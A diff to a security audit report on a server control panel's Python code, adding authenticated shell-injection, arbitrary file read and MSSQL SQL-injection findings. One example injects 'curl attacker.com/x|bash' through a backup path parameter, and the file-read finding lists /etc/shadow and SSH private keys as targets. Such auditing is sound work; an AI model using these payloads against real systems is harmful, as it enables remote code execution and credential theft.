@@ -679,8 +679,48 @@ Beyond the primary chains, these authenticated endpoints have the same `ExecShel
 | `panelTask.py:618` | `pass_opt = '-p"{}"'.format(password)` | 7z password — double-quote breakout |
 | `crontab.py:1479` | `ExecShell("nohup ... {} {} {} &".format(type, second, cronName))` | Cron modification — unquoted |
 | `crontab.py:1488` | `time_check.py time_type={} special_time={} time_list={}` | Cron time check — unquoted |
+| `backup_bak.py:267` | `ExecShell(python_bin + ' ... path %s &' % get.path)` | Backup path — `%s` no quoting |
+| `backup_bak.py:490` | `ExecShell(... ' down %s %s %s %s %s &' % (url,name,type,id,name))` | Backup download — 5 unquoted params |
+| `firewall_new.py:146-155` | `ExecShell('ufw deny from ' + address + ' to any')` | Firewall IP ban — validated by regex but `DelDropAddress` at line 168 reads from DB without re-validation |
 
 Each of these is an independent authenticated RCE. The root cause is the same: `ExecShell()` with `shell=True` and string-formatted user input.
+
+### Authenticated Arbitrary File Read (LFI)
+
+```python
+# BTPanel/__init__.py:1482-1534
+@app.route('/download', methods=method_get)
+def download():
+    comReturn = comm.local()           # Auth required
+    if comReturn: return comReturn
+    filename = request.args.get('filename')
+    ...
+    return send_file(filename, mimetype=mimetype, as_attachment=True, ...)
+```
+
+The `filename` parameter is taken directly from `request.args` with **no path restriction**. After authentication, any file readable by root can be downloaded:
+- `/etc/shadow` — password hashes for all system users
+- `/root/.ssh/id_rsa` — SSH private keys
+- `/www/server/panel/data/default.db` — panel database with API keys, hashed passwords
+- `/www/server/panel/ssl/privateKey.pem` — panel SSL private key
+- Any application database, config file, or secret on the system
+
+This turns any authenticated session (even a low-privilege one, if RBAC existed) into full information disclosure across the entire filesystem.
+
+### Backup Path Shell Injection
+
+```python
+# class/backup_bak.py:267
+public.ExecShell(python_bin + ' /www/server/panel/class/backup_bak.py path %s &' % get.path)
+```
+
+`get.path` is interpolated with `%s` — no quoting, no escaping. This is a direct shell injection via the backup path parameter:
+```
+path = "/var/www; curl attacker.com/x|bash #"
+```
+Results in: `python3 .../backup_bak.py path /var/www; curl attacker.com/x|bash # &`
+
+Same pattern at line 490 with **five** unquoted user parameters in a single command.
 
 ---
 
@@ -720,6 +760,21 @@ if dont_vcode_ip_info["client_ip"] == public.GetClientIp():
 password = md5(md5(password + '_bt.cn') + salt)
 ```
 Double MD5 with static suffix. GPU hashrate: ~8B MD5/sec. Rockyou.txt cracked in < 0.002 seconds.
+
+### SQL Injection in MSSQL Operations
+```python
+# class/databaseModel/sqlserverModel.py:138
+result = mssql_obj.execute("CREATE DATABASE %s" % data_name)
+
+# class/databaseModel/sqlserverModel.py:211
+mssql_obj.execute("backup database %s To disk='%s'" % (find['name'], backupName))
+
+# class/databaseModel/sqlserverModel.py:273-274
+mssql_obj.execute("ALTER DATABASE %s SET OFFLINE WITH ROLLBACK IMMEDIATE" % (find['name']))
+mssql_obj.execute("use master;restore database %s from disk='%s' with replace, MOVE N'%s' TO N'%s'..." % (...))
+```
+
+Multiple SQL operations using `%s` string formatting instead of parameterized queries. If `data_name`, `backupName`, or `find['name']` contain SQL metacharacters, injection is possible. Authenticated only, but enables database takeover.
 
 ---
 
@@ -794,3 +849,7 @@ Double MD5 with static suffix. GPU hashrate: ~8B MD5/sec. Rockyou.txt cracked in
 | `class/userlogin.py` | 546-556 | — | 2FA bypass via stored IP |
 | `class/userlogin.py` | 120-140 | — | Username enumeration via differential errors |
 | `BTPanel/__init__.py` | 1857 | A1 | Login page redirects to `/install` when `install.pl` exists |
+| `BTPanel/__init__.py` | 1482-1534 | — | Authenticated arbitrary file read (LFI) via `/download` |
+| `class/backup_bak.py` | 267, 490 | — | Backup path/download — shell injection via `%s` |
+| `class/firewall_new.py` | 146-179 | — | Firewall IP — shell injection (mitigated by regex on add, not on delete) |
+| `class/databaseModel/sqlserverModel.py` | 138-274 | — | SQL injection via `%s` formatting in MSSQL operations |
